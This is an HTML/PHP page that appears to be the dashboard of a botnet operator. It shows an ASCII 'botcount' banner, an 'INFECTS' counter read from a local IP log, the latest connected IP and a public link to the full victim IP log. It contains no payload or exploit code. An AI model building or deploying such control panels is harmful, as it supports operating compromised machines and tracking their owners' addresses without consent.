<html>
<head>
	<body>	
		<div class="sidenav">
			<a href="index.html">HOMEPAGE</a>
      <a href="about.html">ABOUT</a>
		</div>

		<div class="main">
			<pre>

 __                   __                                               __     
|  \                 |  \                                             |  \    
| $$____    ______  _| $$_     _______   ______   __    __  _______  _| $$_   
| $$    \  /      \|   $$ \   /       \ /      \ |  \  |  \|       \|   $$ \  
| $$$$$$$\|  $$$$$$\\$$$$$$  |  $$$$$$$|  $$$$$$\| $$  | $$| $$$$$$$\\$$$$$$  
| $$  | $$| $$  | $$ | $$ __ | $$      | $$  | $$| $$  | $$| $$  | $$ | $$ __ 
| $$__/ $$| $$__/ $$ | $$|  \| $$_____ | $$__/ $$| $$__/ $$| $$  | $$ | $$|  \
| $$    $$ \$$    $$  \$$  $$ \$$     \ \$$    $$ \$$    $$| $$  | $$  \$$  $$
 \$$$$$$$   \$$$$$$    \$$$$   \$$$$$$$  \$$$$$$   \$$$$$$  \$$   \$$   \$$$$ 


 			</pre>

      <div class="botcount">
        <?php

        $file = "visitors.txt";
        $linecount = 0;

        $handle = fopen($file, "r");

        while (!feof($handle)) {
          $line = fgets($handle);
          $linecount++;
        }

        fclose($handle );

        ?>

        <h3> INFECTS: <?php echo $linecount;?> </h3>
      </div>

      <div class="ips">

      <h1> CONNECTED IPS</h1>  <a href="visitors.txt"> FULL IP LOG </a>
      <p></p>
      
      <?php
        $filename = "visitors.txt";
        $lines = file($filename);
        $lastline = array_pop($lines);

        echo "<br> LATEST IP: " . $lastline . "</br>";
      
      ?>

      </div>



 		</div>
 	</body>
</head>
</html>                                                                  

<style>

body {
  font-family: "Lato", sans-serif;
}

.sidenav {
  height: 100%;
  width: 160px;
  position: fixed;
  z-index: 1;
  top: 0;
  left: 0;
  background-color: #111;
  overflow-x: hidden;
  padding-top: 20px;
}

.sidenav a {
  padding: 6px 8px 6px 16px;
  text-decoration: none;
  font-size: 25px;
  color: #818181;
  display: block;
}

.sidenav a:hover {
  color: #f1f1f1;
}

.main {
  margin-left: 160px; /* Same as the width of the sidenav */
  font-size: 28px; /* Increased text to enable scrolling */
  padding: 0px 10px;
}

.ips {
  margin-left: 160px;
  font-size: 28px;
  padding: 0px 10px;
  font-family: "OCR A Std", monospace;
}

.botcount {
  margin-left: 160px;
  font-size: 28px;
  padding: 0px 10px;
  font-family: "OCR A Std", monospace;
}

@media screen and (max-height: 450px) {
  .sidenav {padding-top: 15px;}
  .sidenav a {font-size: 18px;}
}
</style>